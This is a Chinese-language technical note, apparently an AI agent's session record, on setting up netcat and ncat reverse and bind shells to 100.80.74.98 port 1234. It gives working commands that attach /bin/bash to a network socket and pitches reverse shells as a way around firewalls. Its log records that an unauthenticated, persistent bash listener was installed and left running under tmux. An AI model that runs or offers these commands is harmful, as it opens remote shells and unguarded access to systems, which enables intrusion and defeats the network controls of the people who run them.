# Reverse Shell Pattern — 反向 Shell 实操

**Date**: 2026-07-06
**Session context**: 用户尝试从服务器反向连到客户端（100.80.74.98）的 1234 端口取文件。

## 1. 核心模式

```
控制端（服务端）: nc -l -p 1234       ← 监听端口
被控端（客户端）: nc <控制端IP> 1234 -e /bin/bash  ← 主动连过去
```

**为什么用反向 Shell？** 被控端有防火墙无法直接连接时，被控端主动连到控制端可绕过防火墙。

## 2. 坑：OpenBSD nc 没有 `-e` 参数

```bash
# ❌ 失败 — OpenBSD nc 不支持 -e
nc 100.80.74.98 1234 -e /bin/bash
# Exit code 0, 但 nc 立即退出，没有实际连接

# ✅ 正确 — 使用 ncat（nmap 提供）
ncat 100.80.74.98 1234 -e /bin/bash

# ✅ 持久监听 — ncat -k 让客户端断开后不退出
ncat -l -p 1234 -e /bin/bash -k
```

```bash
# 确认 nc 版本
nc -h 2>&1 | grep -i "OpenBSD"

# 检查 ncat 是否可用
which ncat 2>/dev/null || echo "no ncat — install: sudo apt install -y nmap"
```

## 3. 连接失败排查

1. **确认对方确实在监听**：`ss -tlnp | grep <port>` 必须看到 LISTEN
2. **确认防火墙放行**：`sudo ufw status` 应为"不活动"或允许该端口
3. **检查连通性**：`nc -z -w3 <IP> <PORT>` 测试 TCP
4. **确认 IP 地址**：`hostname -I` 确认本机 IP，确认目标 IP 是否正确
5. **tmux 持久化**：用 `tmux new-session -d -s <name> 'ncat ...'` 包裹，避免 tmux server 被清理

## 4. 坑：nc 连接后立即退出

`nc -l -p 1234` 默认在连接后退出（单次连接）。用 `-k` 保持持续监听：
- OpenBSD nc：无 `-k` 参数，必须用 ncat
- ncat：`ncat -l -p 1234 -e /bin/bash -k`

## 5. 实操记录（2026-07-06）

- 用户要求：`nc 100.80.74.98 1234 -e /bin/bash`
- 首次失败：OpenBSD nc 不支持 `-e`，进程立即退出，tmux session 也不存在了
- 修复：安装 ncat (`sudo apt install -y nmap`)，使用 `ncat -l -p 1234 -e /bin/bash -k`
- 坑：`/tmp/tmux-*` 可能被 tmpfiles 清理，用 `~/.tmux-*` 更稳定
- 坑：`kill` 旧进程后必须确认端口释放再重开，否则会绑定失败

## 6. 对比：正向 Shell vs 反向 Shell

| 模式 | 方向 | 适用场景 |
|------|------|----------|
| 正向 Shell | 服务端监听 → 客户端连入 | 双方网络都可达 |
| 反向 Shell | 客户端主动连到服务端 | 客户端有防火墙/NAT 无法入站 |